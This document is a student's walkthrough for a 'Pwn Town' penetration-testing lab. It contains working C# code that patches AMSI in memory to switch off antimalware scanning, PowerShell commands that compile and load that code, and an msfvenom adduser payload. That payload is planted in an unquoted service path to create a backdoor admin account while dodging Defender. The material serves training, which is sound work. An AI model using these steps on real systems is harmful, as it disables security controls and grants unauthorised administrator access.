# Pwn-Town
Here are all of my notes for the Pwn Town lab!

Starting out
---
The first thing you want to do is get everything prepared. Some things I would to (to make your life easier) is:
* On your local computer, save the RDP configuration to make connecting easier
* Find the `pentest-tools` folder on the lab machine and pin that to quick access

Bypassing AMSI
---
The first major hurdle is bypassing AMSI, or Antimalware Scan Interface. After trying to run some of the powershell tools, you'll quickly notice they can't run because they "contain malware".

```diff
Import-Module .\PowerSploit.psd1
-This script contains malicious content and has been blocked by your antivirus software.
```

The way we can bypass this is a little weird (but works). We're going to compile a C file into a DLL, then load that into powershell. This part of bypassing AMSI was found on [this website](https://www.citadel.co.il/Home/Blog/1008) which took a long time to find!

If you want, you can just download the DLL from this repository and skip to where I load it into powershell.

### Creating the C file
    For this, just open up notepad and copy this code ([source](https://www.citadel.co.il/Home/Blog/1008)):

    ```
    using System;
    using System.Runtime.InteropServices;

    namespace BP
    {
        public class AMS
        {
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);
            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

            [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
            static extern void MoveMemory(IntPtr dest, IntPtr src, int size);


            public static void Disable()
            {
                IntPtr AMSDLL = LoadLibrary("amsi.dll");
                IntPtr AMSBPtr = GetProcAddress(AMSDLL, "Am" + "si" + "Scan" + "Buffer");
                UIntPtr dwSize = (UIntPtr)5;
                uint Zero = 0;
                VirtualProtect(AMSBPtr, dwSize, 0x40, out Zero);
                Byte[] Patch1 = { 0x31 };
                Byte[] Patch2 = { 0xff };
                Byte[] Patch3 = { 0x90 };
                IntPtr unmanagedPointer1 = Marshal.AllocHGlobal(1);
                Marshal.Copy(Patch1, 0, unmanagedPointer1, 1);
                MoveMemory(AMSBPtr + 0x001b, unmanagedPointer1, 1);
                IntPtr unmanagedPointer2 = Marshal.AllocHGlobal(1);
                Marshal.Copy(Patch2, 0, unmanagedPointer2, 1);
                MoveMemory(AMSBPtr + 0x001c, unmanagedPointer2, 1);
                IntPtr unmanagedPointer3 = Marshal.AllocHGlobal(1);
                Marshal.Copy(Patch3, 0, unmanagedPointer3, 1);
                MoveMemory(AMSBPtr + 0x001d, unmanagedPointer3, 1);
                Console.WriteLine("Memory patched successfuly.");
            }
        }
    }
    ```

    Then, you can save this (maybe in a antivirus whitelisted folder>) as whatever you want, but I'm going to call it `AMSI.cs`.

### Compiling code into a DLL
    Now, open up powershell change to the directory you saved the CS file in. Type this, replacing `<NAME>` with the name of the file you just created.

    ```
    Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\<NAME>.cs")) -OutputAssembly "AMSI.dll"
    ```

    This with create a file called AMSI.dll.

### Loading the DLL into powershell
    Now you should have the DLL called `AMSI.dll`. We need to load this into powershell to get around AMSI.

    To do this, type:
    ```
    [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\AMSI.dll"))
    ```

    Then, the final step is to patch the memory:
    ```
    [BP.AMS]::Disable()
    ```

    Now you should be able to run whatever you want in powershell!

Getting Local Admin
---
The next thing you need is local admin. For this, we can exploit the unquoted service path.

### What is Unquoted Service Path?
    The unquoted service path is a path to a file that is unquoted!

    Look at this path: `C:\Users\Marty McFly\run.exe`

    There is a space in between Marty and Mcfly, and that path is not quoted.
    Windows will look for run.exe, but since the path isn't quoted, it goes through the path and looks for files to run. It will end up stopping at Marty (thinking there is a file at _C:\Users_. It will run any file named Marty, and if there is no file, it moves on. Luckily, Windows runs this file with the highest privligas. We can put a file in the unquoted service path to run a payload.

### Finding Unquoted Service Paths
    For the Pwn Twn lab, we need to find unquoted service paths.

    In Powershell, CD to the PowerSploit folder located in `C:1\Users\Public\pentest-tools\PowerSploit-master`. This contains a ton of useful tools. Go ahead and import the module:
    ```
    Import-Module .\Privesc.psd1
    ```
    and check for unquoted service packs:
    ```
    Get-UnquotedService
    ```
    Your output should look something like this:
    ```diff
    ServiceName    : Pwn Town Monitoring Agent
    +Path           : C:\Program Files\Pwn Town\Pwn Agent\agent.exe
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'Pwn Town Monitoring Agent' -Path <HijackPath>
    CanRestart     : False
    Name           : Pwn Town Monitoring Agent
    ```

    The highlighted line is the unquoted path.

    ```
    C:\Program Files\Pwn Town\Pwn Agent\agent.exe
                       ^
    ```

    One option would be to make an EXE file called _Pwn_ that contains a payload.

### Making a Payload

    The payload that we will use creates a new admin account with the credentials you choose. This is perfect!

    A lot of the information in this section came from [this video on YouTube](https://www.youtube.com/watch?v=WWE7VIpgd5I).

    Start up a Kali Linux machine or VM, open terminal, and type this:

    ```
    msfvenom -p windows/adduser USER=backdoom_admin PASS=<INSERTPASSWORD> -f exe > Pwn.exe
    ```

    Don't forget to replace <INSERTPASSWORD> with the password you want. This is going to create a payload that creates a new user using msfvenom with the username *backdoor_admin*, the password of your choice, and it will make it all into an EXE file.

### Getting the Payload into Windows
    Now you need to get the payload into Windows. The best way to do this would be using your virtualization app's built in transfer, but you can also run thos command to make an HTTP file server with python:

    ```
    sudo python -m SimpleHTTPServer 80
    ```

    Now, go to the IP address of the VM in your web browser and add `:80` to the end.

    You should be able to navigate through and download the EXE to your computer.

    (It might be better to watch [the video?](https://youtu.be/WWE7VIpgd5I?t=516))

    When you have it on your computer, extract this into a ZIP file. I had a lot of trouble with transferring EXEs, so a ZIP works perfectly. On Windows, right click and choose _Send to Compressed (Zipped) Folder_. On Mac and Linux, Right Click and choose _Compress_. You can copy this to the Pwn Twn lab by copying and pasting it (most RDP clients have shared clipboards).
    
### Running the Payload
    If you remember from earlier, we can run a payload from a space in the unquoted service path.
    ```
    C:\Program Files\Pwn Town\Pwn Agent\agent.exe
                       ^
    ```
    In this case, it will be located in `C:\Program Files\` and will be called `Pwn.exe`.

    The first step to running the payload is extracting the ZIP file. Make sure you do this into the `pentest-tools` folder because this is whitelisted in Windows Defender and will not be deleted. (To extract on Windows, just right click and press _Extract All_).

    Now, you can open a new windows of file explorer and navigate to `C:\Program Files`. Copy and Paste (or drag and drop) the Pwn file from pentest-tools to Program Files. Quickly reboot the machine after doing this to prevent Windows Defender from deleting the files.

### Logging In to the New Admin Account
    Logging in to the admin account is similar to the student account. in your RDP client, change the username to `localhost/backdoor_admin`.

    ![Image showing RDP client with backdoor_admin as the username](https://user-images.githubusercontent.com/52871476/126045593-e999ae9c-82f3-4f6d-bb83-02e04885c6c9.png)

    Go ahead and connect using the password that you created earlier.

    Now you have an admin account!

### Elevating student account
    Now you can elevate your student account. Do this by going to Settings > Accounts > Family & Other Users (in the admin account), then click on the student account. Click "Change Account Type" and choose Administrator.

